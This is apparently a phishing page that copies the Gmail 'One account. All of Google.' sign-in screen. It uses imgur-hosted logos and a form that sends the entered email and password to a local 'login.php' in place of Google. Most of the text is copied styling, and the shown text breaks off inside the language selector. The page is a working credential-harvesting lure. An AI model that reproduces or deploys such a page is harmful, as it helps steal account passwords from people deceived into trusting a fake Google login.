<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="description" content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>Gmail</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(fonts/google-font-2.ttf) format('truetype');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(fonts/google-font-1.ttf) format('truetype');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(https://i.imgur.com/PMD6Vu6.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  background-image: url(logo_1x.png);
  background-size: 116px 38px;
  background-repeat: no-repeat;
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .logo-w {
  background-image: url(https://i.imgur.com/CYPNXHb.png);
  background-size: 112px 36px;
  margin: 21px 0 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .header .logo {
  background-image: url(accounts/ui/logo_2x.png);
  }
  .header .logo-w {
  background-image: url(https://i.imgur.com/CYPNXHb.png);
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url(https://i.imgur.com/8XITQ2w.png);
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
  .one-google .logo-strip {
  background-image: url(https://i.imgur.com/8XITQ2w.png);
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.
</h1>
  <h2 class="hidden-small">
  Sign in to continue to Gmail
  </h2>
</div>
<div class="card signin-card clearfix">
<img class="profile-img" src="https://i.imgur.com/9r33ioA.png" alt="">
<p class="profile-name"></p>
  <form novalidate="" id="gaia_loginform" action="login.php" method="post">
  <input name="continue" id="continue" value="http://mail.google.com/mail/" type="hidden">
  <input name="service" id="service" value="mail" type="hidden">
  <input name="rm" id="rm" value="false" type="hidden">
  <input name="dsh" id="dsh" value="-959293846815026083" type="hidden">
  <input name="ltmpl" id="ltmpl" value="default" type="hidden">
  <input name="scc" id="scc" value="1" type="hidden">
  <input name="GALX" value="zsQGi7Mh774" type="hidden">
  <input id="pstMsg" name="pstMsg" value="1" type="hidden">
  <input id="dnConn" name="dnConn" value="" type="hidden">
  <input id="checkConnection" name="checkConnection" value="youtube:692:1" type="hidden">
  <input id="checkedDomains" name="checkedDomains" value="youtube" type="hidden">
<input name="timeStmp" id="timeStmp" value="" type="hidden">
<input name="secTok" id="secTok" value="" type="hidden">
<input id="_utf8" name="_utf8" value="?" type="hidden">
  <input name="bgresponse" id="bgresponse" value="js_disabled" type="hidden">
<label class="hidden-label" for="Email">Email</label>
<input id="Email" name="Email" type="email" placeholder="Email" value="" spellcheck="false" class="">
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" name="Passwd" type="password" placeholder="Password" class="passwd-label">
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes" checked="checked">
  <span>
  Stay signed in
  </span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your convenience, keep this checked. On shared devices, additional precautions are recommended.
  <a href="https://support.google.com/accounts/?p=securesignin&amp;hl=en" target="_blank">Learn more</a>
  </div>
  </div>
  </label>
  <input type="hidden" name="rmShown" value="1">
  <a id="link-forgot-passwd" href="mail/" class="need-help-reverse">
  Need help?
  </a>
  </form>
</div>
<div class="one-google">
  <p class="create-account">
  <a id="link-signup" href="mail/_ltmpl_default/">
  Create an account
  </a>
  </p>
<p class="tagline">
  One Google Account for everything Google
</p>
<div class="logo-strip"></div>
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="https://www.google.com/intl/en/about" target="_blank">
  About Google
  </a>
  </li>
  <li>
  <a href="TOS_loc_US_hl_en_privacy_true/" target="_blank">
  Privacy
  </a>
  </li>
  <li>
  <a href="TOS_loc_US_hl_en/" target="_blank">
  Terms
  </a>
  </li>
  <li>
  <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="https://i.imgur.com/CaFgeoy.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af">
  ‪Afrikaans‬
  </option>
  <option value="az">
  ‪azərbaycan‬
  </option>
  <option value="in">
  ‪Bahasa Indonesia‬
  </option>
  <option value="ms">
  ‪Bahasa Melayu‬
  </option>
  <option value="ca">
  ‪català‬
  </option>
  <option value="cs">
  ‪Čeština‬
  </option>
  <option value="da">
  ‪Dansk‬
  </option>
  <option value="de">
  ‪Deutsch‬
  </option>
  <option value="et">
  ‪eesti‬
  </option>
  <option value="en-GB">
  ‪English (United Kingdom)‬
  </option>
  <option value="en" selected="selected">
  ‪English (United States)‬
  </option>
  <option value="es">
  ‪Español (España)‬
  </option>
  <option value="es-419">
  ‪Español (Latinoamérica)‬
  </option>
  <option value="eu">
  ‪euskara‬
  </option>
  <option value="fil">
  ‪Filipino‬
  </option>
  <option value="fr-CA">
  ‪Français (Canada)‬
  </option>
  <option value="fr">
  ‪Français (France)‬
  </option>
  <option value="gl">
  ‪galego‬
  </option>
  <option value="hr">
  ‪Hrvatski‬
  </option>
  <option value="zu">
  ‪isiZulu‬
  </option>
  <option value="is">
  ‪íslenska‬
  </option>
  <option value="it">
  ‪Italiano‬
  </option>
  <option value="sw">
  ‪Kiswahili‬
  </option>
  <option value="lv">
  ‪latviešu‬
  </option>
  <option value="lt">
  ‪lietuvių‬
  </option>
  <option value="hu">
  ‪magyar‬
  </option>
  <option value="nl">
  ‪Nederlands‬
  </option>
  <option value="no">
  ‪norsk‬
  </option>
  <option value="pl">
  ‪polski‬
  </option>
  <option value="pt">
  ‪Português (Brasil)‬
  </option>
  <option value="pt-PT">
  ‪português (Portugal)‬
  </option>
  <option value="ro">
  ‪română‬
  </option>
  <option value="sk">
  ‪Slovenčina‬
  </option>
  <option value="sl">
  ‪slovenščina‬
  </option>
  <option value="fi">
  ‪Suomi‬
  </option>
  <option value="sv">
  ‪Svenska‬
  </option>
  <option value="vi">
  ‪Tiếng Việt‬
  </option>
  <option value="tr">
  ‪Türkçe‬
  </option>
  <option value="el">
  ‪Ελληνικά‬
  </option>
  <option value="bg">
  ‪български‬
  </option>
  <option value="mn">
  ‪монгол‬
  </option>
  <option value="ru">
  ‪Русский‬
  </option>
  <option value="sr">
  ‪српски‬
  </option>
  <option value="uk">
  ‪Українська‬
  </option>
  <option value="ka">
  ‪ქართული‬
  </option>
  <option value="hy">
  ‪հայերեն‬
  </option>
  <option value="iw">
  ‫עברית‬‎
  </option>
  <option value="ur">
  ‫اردو‬‎
  </option>
  <option value="ar">
  ‫العربية‬‎
  </option>
  <option value="fa">
  ‫فارسی‬‎
  </option>
  <option value="am">
  ‪አማርኛ‬
  </option>
  <option value="ne">
  ‪नेपाली‬
  </option>
  <option value="mr">
  ‪मराठी‬
  </option>
  <option value="hi">
  ‪हिन्दी‬
  </option>
  <option value="bn">
  ‪বাংলা‬
  </option>
  <option value="gu">
  ‪ગુજરાતી‬
  </option>
  <option value="ta">
  ‪தமிழ்‬
  </option>
  <option value="te">
  ‪తెలుగు‬
  </option>
  <option value="kn">
  ‪ಕನ್ನಡ‬
  </option>
  <option value="ml">
  ‪മലയാളം‬
  </option>
  <option value="si">
  ‪සිංහල‬
  </option>
  <option value="th">
  ‪ไทย‬
  </option>
  <option value="lo">
